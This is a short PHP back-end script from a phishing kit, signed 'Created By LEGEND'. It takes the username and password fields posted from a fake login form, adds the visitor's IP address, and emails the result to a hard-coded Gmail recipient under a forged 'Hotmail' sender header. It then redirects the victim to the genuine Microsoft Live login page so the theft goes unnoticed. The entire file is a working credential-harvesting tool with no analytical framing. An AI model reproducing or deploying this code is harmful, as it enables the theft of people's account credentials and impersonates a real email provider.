<?

$adddate = date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Created By LEGEND-------------------------\n";
$message .= " \n";
$message .= "Domain name: ".$_POST['userid']."\n";
$message .= "Panel username: ".$_POST['pass']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= " \n";
$message .= "IP: ".$ip."\n";
$message .= " \n";
$message .= "---------------Created By LEGEND-------------------------\n";
$recipient = "tngilroy1@gmail.com";
$subject = "Result from Hotmail";
$headers = "From:  Hotmail<rezultz@Suntrust.pot>";
$headers .= $_POST['eMailAdd']."\n";
if (mail($recipient,$subject,$message, $headers))
{
header("Location: https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1501462420&rver=6.7.6643.0&wp=MBI_SSL_SHARED&wreply=https:%2F%2Fmail.live.com%2Fdefault.aspx&lc=1033&id=64855&mkt=en-us&cbcxt=mai");
}
?>
